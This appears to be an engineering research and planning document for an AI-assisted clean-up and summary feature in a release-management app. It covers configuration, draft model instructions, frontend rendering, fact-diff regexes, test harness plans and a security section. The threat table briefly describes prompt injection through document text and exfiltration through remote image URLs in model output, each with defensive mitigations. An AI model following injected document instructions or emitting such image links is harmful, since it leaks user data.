**Capacity reality check (dev GPU).** The advertised limit is about 5.3k characters, but generation at the Phase 10 measured 1.3 to 7.7 tokens/s allows roughly 470 to 2,770 output characters inside the 120 s deadline (AI-SPEC arithmetic, [ASSUMED] until measured). Real documents under the limit will frequently end `DEADLINE` on the dev machine. The plan must keep fixture documents small enough to complete on dev and run the AI-SPEC latency decision rule only as a recorded measurement (binding evaluation is the production host). Do not add a `max-chars` cap key now; add it only if the production-host rule selects branch 3.

### 6. Config keys and default instruction texts

**Location.** Do not use `app.assistant.prompts.<mode>.<type>`: 13-01 types `prompts` as `{scopedQuestion, toolDescriptions}` and a mixed map would fight the typed record. Use a sibling block inside `AssistantProperties` (appended after 13-01's components):
```yaml
app:
  assistant:
    document-assist:
      num-ctx: ${RM_ASSISTANT_NUM_CTX:4096}        # must equal rag.chat.num-ctx; test yml: 4096
      chars-per-token: 3.0                          # = rag.chat.chars-per-token
      system-tokens: 152                            # = ceil(len(rag TRANSFORM_SYSTEM) / chars-per-token), p10-v2
      instruction-max-chars: 2000                   # = rag.chat.instruction-max-chars
      markdown-max-chars: 200000                    # cap on a saved result
      instructions:
        clean-up:  { release-notes: "...", runbook: "...", approval: "..." }
        summarize: { release-notes: "...", runbook: "...", approval: "..." }
```
Bind as nested records `Instructions(ByType cleanUp, ByType summarize)` and `ByType(String releaseNotes, String runbook, String approval)` so kebab names bind without enum-key conversion questions. Startup validation (only when `enabled`, like 13-01): every text non-blank and at most `instruction-max-chars`; `num-ctx`, `chars-per-token`, `system-tokens` positive; `markdown-max-chars` positive. Add all keys to **both** `src/main/resources/application.yml` and `src/test/resources/application.yml` (identical text; `${...}` placeholders only for scalars), extend `AssistantPropertiesTest` to bind both files and assert the six texts are identical, and document list/multi-line overrides via `SPRING_APPLICATION_JSON` or `SPRING_CONFIG_ADDITIONAL_LOCATION` in `docs/docker.md` (13-01 writes the same paragraph; add one sentence naming these keys). Do not put multi-line text in `compose.app.yaml`. `compose.app.yaml`/`.env.example` get only `RM_ASSISTANT_NUM_CTX` if it is added. Option noted, not recommended: one `assistant-instructions.yml` pulled in by `spring.config.import` in both ymls would avoid duplicating six paragraphs, but it departs from D-13-17's "both application.yml files" wording.

**Draft default instructions** (lengths measured; each keeps the Markdown structure, keys, versions, dates, environments and order, says "Output Markdown, not plain text" to counter `TRANSFORM_SYSTEM` rule 4, and avoids `<<<`/`>>>`). Tune against the golden fixture; these are starting wording, not final.

- clean-up / release-notes (414 chars, document limit 5,325): "Clean up this Markdown release note. Fix spelling, grammar and duplicated wording only. Output Markdown, not plain text: keep the headings, lists, tables and links exactly as structured. Keep every ticket key, version, date and environment name unchanged, and leave [[unknown: ...]] markers as they are. Do not add, remove or reorder items. Return only the cleaned document, with no introduction and no code fence."
- clean-up / runbook (508, 5,277): "Clean up this Markdown deployment runbook. Fix spelling and grammar only. Output Markdown, not plain text: keep the headings, numbered steps, tables and code blocks as structured. Keep every step in the same order with the same commands, paths, flags, versions, environment names and owners. Do not merge, split, add or remove steps. Keep rollback triggers, thresholds and warnings exactly. Leave [[unknown: ...]] markers as they are. Return only the cleaned document, with no introduction and no code fence."
- clean-up / approval (536, 5,262): "Clean up this Markdown change approval document. Fix spelling and grammar only. Output Markdown, not plain text: keep the headings, section labels, lists and tables as structured. Keep every ticket key, version, date, environment and downtime window unchanged. Keep the strength of each statement about risk, impact and backout: do not change will to may or must not to should not, and do not add or remove conditions. Leave [[unknown: ...]] markers as they are. Return only the cleaned document, with no introduction and no code fence."
- summarize / release-notes (248, 5,406): "Summarize this Markdown release note as a short bulleted list for stakeholders. Use only facts in the text and invent nothing. Write each ticket key and version you mention exactly as written. Return only the Markdown summary, with no introduction."
- summarize / runbook (287, 5,388): "Summarize this Markdown deployment runbook as a short overview of its main phases: deploy, validation and rollback. Use only facts in the text and invent nothing. Write environment names, versions and thresholds exactly as written. Return only the Markdown summary, with no introduction."
- summarize / approval (329, 5,367): "Summarize this Markdown change approval document in a few bullets covering risk, impact, backout plan and timing. Use only facts in the text and invent nothing. Keep the strength of each statement, and write ticket keys, versions, dates and environments exactly as written. Return only the Markdown summary, with no introduction."

Each 100 instruction characters costs about 50 characters of document capacity, so keep them near these lengths. Quote them in YAML (they contain colons and brackets).

### 7. Frontend [VERIFIED from code]

- **`DocumentViewerRoute`.** The route (about 200 lines) owns the header (Revision `<select>`, `ExportButtons`), `templateDeleted` note, superseded banner (`mx-6 mt-2 rounded bg-gray-100 p-3`), the `m-6` document card and the parity hint. `renderBody(markdown)` is a **local** function using `md.render` + `chipUnknownMarkers` + `dangerouslySetInnerHTML`. Plan: move it to `RenderedDocument.tsx` as an exported `MarkdownBody({ markdown, blockImages })` (the route and the Preview both use it), add `AiAssistPanel` as a wrapper around the document card so it can swap the single card for the two-column grid and report "result open" upward to disable the Revision select. Insert the AI-assisted and verify banners after the superseded banner (UI-SPEC order). The assist bar renders only when Phase 13's `useAssistantStatus` reports `enabled` and `data.revision === data.latestRevision`.
- **State.** Result card state (streaming, buffer, view mode, abort controller) is component-local (`useReducer`); leaving the route aborts. Only the recent-5 instructions need a module-level store (`useSyncExternalStore`, pattern in `api/credentialStatus.ts`). No browser storage.
- **Remote-image rule.** The shared `md` instance uses `html:false, linkify:false`, which does not stop `![x](https://...)`, and markdown-it's default `validateLink` does not block remote `https:` images. Add a per-render switch through `env`: `md.render(src, { blockImages: true })` plus an override of `md.renderer.rules.image` that returns escaped `[image: alt]` text when `env.blockImages` and otherwise calls the default rule (renderer rules receive `(tokens, idx, options, env, self)` [CITED: markdown-it docs, architecture.md]). Use `escapeHtml` from `md.utils` on `tokens[idx].content`. Apply it for Preview always and for the saved viewer when `data.aiAssisted` (UI-SPEC assumption 9, recommended yes). Links in Preview need `rel="noopener noreferrer" target="_blank"` (a `link_open` rule override gated on the same env flag); the existing viewer's links are unchanged.
- **`DocumentsSection`.** `DocumentRow` already has `latest` (from `useDocumentRevisions`) and `readinessState`; the regenerate notice goes directly under the button row `div` (the row with the template `<select>` and Generate/Regenerate button), rendered when `latest?.aiAssisted && readinessState !== 'NO_TEMPLATE'`, with an `id` referenced by the button's `aria-describedby`. `RevisionRow` gets the badge after "(latest)/(superseded)", "generated" becomes "saved" for AI rows, and a second line `AI instruction: Clean up` or the quoted custom text. The STALE/UP_TO_DATE summary lines in `DocumentRow` also say "generated" and need the same "saved" switch.
- **Mutation.** `useSaveAiRevision` in a new `api/documentAssist.ts` invalidates exactly what `useGenerateDocument` invalidates (`['releases']`, readiness, `['dashboard']`, the document key prefix, the revisions list) and sets the new revision's query data; also invalidate the assistant freshness query if 13-01's key exists.
- **Stream client.** After 13-02 lands, extract the read loop in `streamChat` into a generic `streamSse(path, body, signal, onEvent)` and keep `streamChat` as a thin wrapper; add `streamTransform` with the transform event union (`token`, `done{finishReason, truncated, complete}`, `error{outcome, retryAfterSeconds?, maxChars?}`). Reuse `apiFetchRaw` so XSRF echo and the single 401 refresh come for free; a 413 problem arrives as an `ApiError` before any stream.
- **Test infrastructure.** Vitest + jsdom under `frontend/tests/**`; `DocumentViewerRoute.test.tsx` and `DocumentsSection.test.tsx` exist and need fixture updates. 13-02 notes jsdom may lack `ReadableStream` on `Response` (assumption A5 there); reuse whatever it resolved.

### 8. FactDiff [regexes are drafts to verify against fixtures]

Repo precedent for a ticket key is `^[A-Z][A-Z0-9]*-[0-9]+$` (create/add request validation, `ReleaseService`), and `TicketsTool` uses `[A-Z][A-Z0-9_]+-\d+`. Use the project's canonical shape with boundaries so mid-word matches are ignored:
```
TICKET_KEY = (?<![A-Za-z0-9_])[A-Z][A-Z0-9_]*-\d+(?![A-Za-z0-9_])
VERSION    = (?<![\w.])v?\d+(?:\.\d+){1,3}(?:-[0-9A-Za-z][0-9A-Za-z.]*)?(?![\w])
```
`UTF-8`, `SHA-256`, `ISO-8601` match the key pattern, and section numbers like `3.1` or `99.5%` match the version pattern. That is acceptable: the diff compares sets, so an unchanged false positive never warns, and a changed one is worth a look. Keep the leading `v` inside the token (a `v4.2.0` rewritten to `4.2.0` is a visible change). Output: `missing = original \ result`, `added = result \ original`, per kind, sorted, capped at 10 chips in the UI. Pin the known blind spots with tests (key moved to another item, environment swapped, date changed produce no warning).
**Where it runs.** The UI warning needs a TypeScript implementation (live, debounced on the edited buffer, UI-SPEC assumption 7). The server copy exists only to log counts at save (AI-SPEC section 7) and for the live harness; it is about 25 lines of Java in `application.assistant`. Recommended: implement both with the same regex strings and ~8 shared vectors in each test file; mark the server log counts as the cuttable part if the planner wants less code (they are not a D-14 decision). Do not add an endpoint that diffs.

### 9. Live eval harness

- **Phase 13's profile is not named `golden`.** rag-service has a `golden` profile (module pom: `<excludedGroups>golden</excludedGroups>` default, profile sets `<groups>golden</groups><excludedGroups>none</excludedGroups>`), but the root pom has no tag exclusion and no profile today, and Phase 13 research plans a root `quality-gate` tag/profile (`QualityGateIT`) that lands in a later Phase 13 plan (not 13-01..06). The surefire includes in the root pom match `**/*IT.java`, so a tagged IT would run in `mvn test` unless excluded.
- **Placement.** `src/test/java/com/evision/releasemgmt/golden/AssistantTransformGoldenIT.java` tagged `@Tag("assistant-golden")`, plus `src/test/resources/golden/assistant/transform-v1.json` and `docs/*.md`. Needs no Spring context and no Docker: build the client with the public static `RagRestClientConfig.ragClient(baseUrl, apiKey, connectTimeout, readTimeout)`, construct `RagTransformAdapter` directly, load the real instruction texts by binding `src/main/resources/application.yml` the way `AssistantPropertiesTest` does, and use `FactDiff`. Read `RAG_GOLDEN_BASE_URL` and `RAG_GOLDEN_API_KEY` from the environment and `Assumptions.assumeTrue` both, so a misconfigured exclusion still cannot hit rag-service.
- **Maven.** Whichever of Phase 13's gate plan and Phase 14 lands second merges the root `<excludedGroups>` property to list both tags and adds an `assistant-golden` profile (`<groups>assistant-golden</groups><excludedGroups>none</excludedGroups>`). Run with `mvn -P '!frontend' -Passistant-golden test` (surefire runs under `test`; the repo configures no failsafe, so AI-SPEC's `mvn verify` is not needed). Report to `target/assistant-golden-report.json`, metadata only.
- **Scope advice.** The AI-SPEC fixture (17 documents, 22 case-modes, 66 runs) is long on a 4 GB GPU where a single 1,500-character Clean up can take 90 to 540 s. Plan the hermetic suite and a first live set (for example R01, B02, A02, N01, I01, O01 and one Summarize and Custom) with a user checkpoint on labels, and treat the remainder as additive. This is a recommendation to the planner; the AI-SPEC contract is not changed.

### 10. Sequencing against Phase 13 plans

| Phase 14 work | Must depend on | Why |
|---------------|----------------|-----|
| `AssistantProperties` document-assist block, both ymls, `AssistantPropertiesTest`, `docs/docker.md` | **13-01** (done before) | Same record, same two ymls, same test and doc paragraph; 13-01 changes the canonical constructor |
| Persistence, `AiAssist`, V12, `AiRevisionService`, readiness change, export/index tests | none from Phase 13 | Independent; can run in the first wave in parallel with Phase 13 |
| `SseStreamReader` extraction, `RagTransformPort`/`Adapter` | **13-05** (heartbeat, `ListenerFailure`, Retry-After, `Failed.retryAfterSeconds`) and **13-03** (`ClientGoneException`, listener-exception contract) | Edits the same loop in `RagChatAdapter`; reuse the same outcome shape |
| Browser controller (transform SSE relay, limits, save) | **Phase 13 browser-controller plan (13-08 per the 13-02 interface text; not written yet)**, plus 13-01 for `stream-deadline` and the status switch | Reuse `BrowserListener`/emitter helper and `ClientGoneException`. If the Phase 13 helper is private to `AssistantChatController`, extract the small "send event, forward heartbeat, deadline, client gone" part first |
| Frontend `documentAssist.ts`, panel | **13-02** (`apiFetchRaw`, `parseSse`, `useAssistantStatus`) and **13-01** (`/status`) | Stream client and the enabled gate |
| Frontend viewer integration | none beyond the above | `DocumentViewerRoute` and `DocumentsSection` are not touched by Phase 13 plans 01-06 (13-04/13-06 touch `AppShell`, router, chat components) |
| Live golden harness and root pom profile | Phase 13 gate plan (root pom `excludedGroups`, `quality-gate` profile, prompt hash) and **13-10** (rag `PromptRules`, `done` fields) | Shared pom property; `system-tokens` must track `rag.prompts.transform-system` |
| `AssistantSwitchOffIT` | extend after 13-01 (it gains status assertions there) | Add the new beans to the "no bean when off" list and assert the transform endpoints are absent when off |

Final check at planning time: re-read the actual 13-0x SUMMARY files for real class names (`BrowserListener`, `ClientGoneException`, `StreamEvent` types) rather than the research sketches.

## Code Examples

### Domain: AI provenance on the snapshot
```java
// Source: derived from DocumentSnapshot.java (read this session); not compiled
public record AiAssist(AiMode mode, String instruction, int sourceRevision, Instant basisGeneratedAt) {}

public record DocumentSnapshot(UUID id, UUID releaseId, TemplateDocumentType documentType, int revision,
                               String markdown, UUID templateId, String templateName, String templateBody,
                               ChromeFields chrome, Instant generatedAt, String generatedBy, AiAssist aiAssist) {
    public boolean aiAssisted() { return aiAssist != null; }
    public Instant stalenessBasis() { return aiAssist == null ? generatedAt : aiAssist.basisGeneratedAt(); }
}
```

### Entity mapping
`@Enumerated(EnumType.STRING) @Column(name="ai_mode") AiMode aiMode; @Column(name="ai_instruction") String aiInstruction; @Column(name="ai_source_revision") Integer aiSourceRevision; @Column(name="basis_generated_at") Instant basisGeneratedAt;` with the existing `toEntity`/`toDomain` extended; nulls in all four map to `aiAssist == null`.

### Transform port (errors returned, never thrown; listener exceptions propagate per 13-05)
```java
// Source: AI-SPEC section 3 shape, adjusted to avoid changing FailureReason
public interface RagTransformPort {
    TransformOutcome transform(String text, String instruction, TransformListener listener);
    interface TransformListener { void token(String text); void heartbeat(); }
}
public sealed interface TransformOutcome {
    record Done(String finishReason, boolean truncated, Integer promptTokens, Integer completionTokens) implements TransformOutcome {}
    record TooLarge(Integer maxChars) implements TransformOutcome {}
    record Failed(FailureReason reason, Integer retryAfterSeconds) implements TransformOutcome {}
}
```

### Wire facts for the adapter tests (WireMock)
`event: status` / `data: {"requestId":"..","phase":"GENERATING"}`; `event: token` / `data: {"text":"..."}`; `: heartbeat` comment; `event: done` / `data: {"refusal":false,"refusalLayer":null,"finishReason":"stop","truncated":false,"promptTokens":512,"completionTokens":300}`; `event: error` / `data: {"reason":"DEADLINE"}`; HTTP 413 `application/problem+json` with `reason":"TEXT_TOO_LARGE"`; HTTP 429 with `Retry-After`.

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| AI-SPEC: real-division size mirror | Integer-division mirror with vectors | This research | Removes a one-token boundary mismatch |
| CONTEXT: readiness unchanged | Staleness basis column | This research | D-14-01 stays true |
| AI-SPEC: `DocumentType` enum, `/api/assistant/documents/ai-revisions` | Reuse `TemplateDocumentType` (RELEASE_NOTES, RUNBOOK, APPROVAL) already used by the document API | Repo reading | No second enum with identical values |
| AI-SPEC: client sends the CLEAN_UP instruction | Server records its configured text | This research | Truthful audit record |

**Deprecated/outdated:** the AI-SPEC note that no migration later than V9 exists (V10, V11 exist); the AI-SPEC `mvn verify` command (no failsafe configured); the AI-SPEC claim that the Phase 13 profile is called `golden`.

## Assumptions Log

| # | Claim | Section | Risk if Wrong |
|---|-------|---------|---------------|
| A1 | openhtmltopdf fetches absolute `http(s)` image URLs found in body HTML (base URI `null` blocks relative paths only) | Security Domain, Pitfall 7 | If it does not fetch, no server-side hardening is needed; if it does, AI output (and templated Jira text) can trigger outbound requests. Wave 0 probe settles it |
| A2 | Ollama returns `done_reason` `stop` for a normal finish and `length` when `num_predict` is hit | Finding 4 | Complete/incomplete classification wrong; the adapter test and a live smoke should confirm |
| A3 | Dev GPU throughput (1.3 to 7.7 tokens/s) makes most documents near the size limit end `DEADLINE` | Finding 5 | Fixture sizing and plan expectations change; measure on the first live run |
| A4 | The Phase 13 browser controller plan is 13-08 and exposes a reusable emitter helper | Finding 10 | Wrong plan reference or private helper; re-read 13-0x SUMMARY before planning the controller |
| A5 | Draft instruction wordings keep structure and facts on qwen2.5-coder:7b | Finding 6 | Tune against the golden fixture; they are starting text, not tested |
| A6 | The jsdom environment can build a `ReadableStream` response for tests | Finding 7 | 13-02 raises and resolves this; reuse its resolution |
| A7 | 13-D-13-18 may change `TRANSFORM_SYSTEM`, invalidating `system-tokens: 152` | Pitfall 8 | Pre-flight and server 413 diverge; the boundary-vector test and a live O01 case catch it |

## Open Questions

1. **Should `ai_assisted` be an explicit column?**
   - What we know: `ai_mode IS NOT NULL` already encodes it; D-14-01/AI-SPEC name the flag.
   - What's unclear: whether the user wants a literal boolean.
   - Recommendation: derive it (fewer columns, no inconsistent state); the API still exposes `aiAssisted`.

2. **Does PDF export fetch remote images?** (A1) Wave 0 probe test with a WireMock image URL in the markdown. If it fetches, harden `PdfExportAdapter` (block non-data URIs) or neutralise image nodes at AI save; decide with the user since it affects non-AI revisions too.

3. **Server-side FactDiff counts at save.** AI-SPEC section 7 wants them in the log; no D-14 decision needs them. Include (small) or cut to avoid a second regex implementation. Recommendation: include, with shared vectors.

4. **Should the assistant index carry `ai_assisted` metadata?** Not required by any decision; the assistant could cite an AI revision as authoritative text. Recommendation: defer unless the user asks.

5. **Live fixture size for Phase 14 exit.** AI-SPEC's 22 cases are large for the dev GPU. Recommendation: first live set of about 8 cases at checkpoint, grow later.

6. **Server `max-chars` cap for latency.** Do not add until the production-host decision rule selects it.

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| JDK 25 | Backend build/tests | yes | `C:/Users/ucs/.jdks/jdk-25` | JDK 21 also installed |
| Maven | Backend build/tests | yes | 3.9.11 | - |
| Node | Frontend tests/build | yes | v20.19.0 (meets Vite 8 floor) | - |
| `frontend/node_modules` | Vitest | present | - | `npm ci` in `frontend/` (not in a Vite dev server) |
| Docker (Testcontainers Postgres for ITs) | `DocumentSnapshotPersistenceIT`, `IndexAfterCommitIT`, `AssistantSwitchOffIT` | not probed (must not be touched) | - | Planner runs ITs on a host with Docker; unit/WireMock tests need none |
| rag-service + Ollama | Live golden harness only | not probed (must not be touched) | - | Hermetic tier runs without them; live run is a human step |
| jq | - | absent | - | Not needed |

**Missing dependencies with no fallback:** none for the hermetic tier.

## Security Domain

`security_enforcement` is enabled (absent in config means on; `security_asvs_level: 1`). `workflow.nyquist_validation` is `false`, so the Validation Architecture section is intentionally omitted; test pins and gaps are inline in the findings.

### Applicable ASVS Categories

| ASVS Category | Applies | Standard Control |
|---------------|---------|-----------------|
| V2 Authentication | no change | Existing cookie JWT chain; new endpoints are under `/api/**` (authenticated) |
| V3 Session Management | no change | Existing; async-dispatch authorization risk is Phase 13's IT (Finding 1 there) and applies to the new SSE endpoint too |
| V4 Access Control | yes | Server resolves release/type/revision; no client text reaches the model; 404/409 before the stream; assistant endpoints absent when the switch is off |
| V5 Input Validation | yes | Bean Validation on request records; `@Size` caps (instruction 2000, markdown `markdown-max-chars`); reject NUL in instruction/markdown (Postgres TEXT cannot store `\u0000`, which would be a 500) |
| V6 Cryptography | no | No new secrets; rag key stays server-side |
| V7/V8 Logging, data protection | yes | Metadata-only logs; `toString` redaction on request records; no text in metric tags |
| V12/V13 Files, API | yes | Download is client-side Blob; SSE headers `no-cache`, `X-Accel-Buffering: no` |

### Known Threat Patterns

| Pattern | STRIDE | Standard Mitigation |
|---------|--------|---------------------|
| Prompt injection via document or instruction text (T03 0/3 on dev model) | Tampering | rag fencing/neutralising (SAFE-02), human review beside the original, nothing applied automatically, production model must pass T03 |
| Model output carries a remote image URL that exfiltrates data on render | Information disclosure | Preview and AI-revision viewer render `[image: alt]` only; Wave 0 probe of the PDF path (A1); decide neutralisation at save if the probe fetches |
| Truncated or summarised output saved as the record | Tampering | Save UI blocks on non-`stop`/truncated/error; server rejects `SUMMARIZE` with 400; `sourceRevision` must equal latest (409) |
| Client forges the original text or the CLEAN_UP instruction | Tampering/Repudiation | Transform input is the stored revision; CLEAN_UP records the server's configured text |
| Document or result text in logs | Information disclosure | Metadata only; exception messages never echo bodies; log-hygiene test with a canary (D9) |
| Slot held after browser abort | DoS | Heartbeat forwarding + `ClientGoneException` closes upstream (Phase 13 chain) |
| Oversized or NUL-containing save body | DoS/Tampering | Size caps and NUL rejection at the boundary; rag 2 MB request cap upstream |
| Missing CSRF on POST | CSRF | Locked decision: `SameSite=Strict` is the control |

## Sources

### Primary (HIGH confidence)
- Repository code read this session: `DocumentSnapshot`, `DocumentSnapshotEntity`, `DocumentSnapshotRepositoryAdapter`, `DocumentSnapshotRepository`, `DocumentGenerationService`, `DocumentReadinessService`, `DocumentExportService`, `DocumentController`, `DocumentResponse`/`DocumentRevisionResponse`, `IndexInvalidationListener`, `IndexSyncer`, `IndexDocumentMapper`, `RagChatAdapter`, `RagChatPort`, `RagRestClientConfig`, `AssistantProperties`, `AssistantConfig`, `GlobalExceptionHandler`, `ArchitectureBoundaryTest`, `AssistantSwitchOffIT`, `IndexAfterCommitIT`, `DocumentReadinessServiceTest`, migrations V5/V6 and the directory listing (V1..V11), `PdfExportAdapter`/`MustacheFlexmarkRenderAdapter`/`DocxAstWalker` (image handling), root `pom.xml`; rag-service `TransformService`, `PromptBuilder`, `Prompts`, `TokenEstimator`, `TextTooLargeException`, `GlobalExceptionHandler`, `ChatController`, `StreamEvents`, `StatusController`/`StatusResponse`, `application.yml`, `openapi.json`, golden fixtures and pom profile; frontend `DocumentViewerRoute`, `RenderedDocument`, `DocumentsSection`, `api/documents.ts`, `package.json`, `tsconfig.json`.
- Planning artifacts: 14-CONTEXT, 14-AI-SPEC, 14-UI-SPEC, 13-CONTEXT, 13-RESEARCH, 13-01..06-PLAN, 12-10-SUMMARY, 10-09-SUMMARY, ROADMAP Phase 14, REQUIREMENTS, STATE.
- markdown-it renderer rule signature and image-rule override: Context7 `/markdown-it/markdown-it` (docs/architecture.md, docs/examples/renderer_rules.md).
- Computed this session: size-limit vectors (node script against the rag formula).

### Secondary (MEDIUM confidence)
- AI-SPEC claims about Phase 10 latency (1.3 to 7.7 tokens/s) are from 10-09-SUMMARY measurements; the output-length arithmetic is the AI-SPEC author's.

### Tertiary (LOW confidence)
- openhtmltopdf remote image behaviour (A1), Ollama `done_reason` values (A2), draft instruction effectiveness (A5).

## Metadata

**Confidence breakdown:**
- Standard stack: HIGH, nothing new; versions read from manifests.
- Architecture: HIGH for persistence/readiness/export/index (code read); MEDIUM for the Phase 13 seams (controller plan unwritten).
- Pitfalls: HIGH for those taken from code (readiness, formula, 413 body, constructor churn); MEDIUM for A1 and A3.

**Research date:** 2026-10-16
**Valid until:** 2026-10-23 for anything touching `AssistantProperties`, `RagChatAdapter`, rag `Prompts`/`done` (Phase 13 plans are being written and Phase 11/13 edit them); 30 days for the persistence and frontend findings.
